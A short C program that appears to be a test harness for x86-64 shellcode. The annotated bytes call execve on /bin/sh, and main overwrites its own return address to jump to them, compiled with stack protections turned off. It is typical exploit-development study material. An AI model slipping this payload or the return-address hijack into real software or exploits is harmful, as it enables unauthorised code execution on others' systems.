// gcc -no-pie -fno-stack-protector -z execstack -o testsc2 testsc2.c

#include <stdio.h>

__attribute__((section(".text")))
unsigned char shellcode[] =
    "\x48\x31\xd2"                              // xor    %rdx,%rdx
    "\x52"                                      // push   %rdx
    "\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // movabs "//bin/sh",%rax
    "\x50"                                      // push   %rax
    "\x48\x89\xe7"                              // mov    %rsp,%rdi
    "\x52"                                      // push   %rdx
    "\x57"                                      // push   %rdi
    "\x48\x89\xe6"                              // mov    %rsp,%rsi
    "\x31\xc0"                                  // xor    %eax,%eax
    "\xb0\x3b"                                  // mov    $59,%al
    "\x0f\x05";                                 // syscall

int main(void) {
    long *ret;
    void *rbp;
    __asm__ volatile("mov %%rbp, %0" : "=r"(rbp));
    ret = (long *)((char *)rbp + 8);
    *ret = (long)shellcode;
    return 0;
}